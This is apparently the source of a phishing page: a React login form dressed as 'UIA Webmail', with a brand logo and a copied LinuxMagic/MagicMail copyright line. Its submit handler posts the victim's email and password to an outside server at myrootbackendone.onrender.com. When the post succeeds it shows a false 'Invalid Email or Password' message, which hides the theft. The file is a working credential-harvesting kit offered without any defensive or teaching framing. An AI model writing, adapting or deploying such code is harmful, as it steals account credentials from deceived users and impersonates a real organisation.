import React from 'react';


import'./home.css';
import logo from './logo.png';
import mascon from './mascon.png';
import uia from './uia.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("UIA")

    const[showError, setShowError] = useState(false);


    

    


    

async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

    return (
        <>
            <nav className='mynav px-3 py-3'>
                

            </nav>

                <div className='py-5'>

                </div>

                <div className='text-center'>
                <img src={uia} className="logoimage" />
                

            </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-4 m-auto p-0 rounded'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}


          

                <div className='cardhead text-center'>
                Welcome to UIA Webmail
                </div>

                <form onSubmit={handleSubmit}>

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">Email</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>


                    <div className='buttondiv py-4 text-center'>
                        <button className='mybutton'type="submit">Login</button>

                    </div>



                </form>

                

            </div>
            
            <br/>

                <p className='info mt-5 py-3 'style={{
                    backgroundColor:"white",
                    color:"black",
                }}>© Copyright 2009-2023 LinuxMagic Inc. All Rights Reserved
www.magicmail.com</p>
        </>
    );

}

export default Home;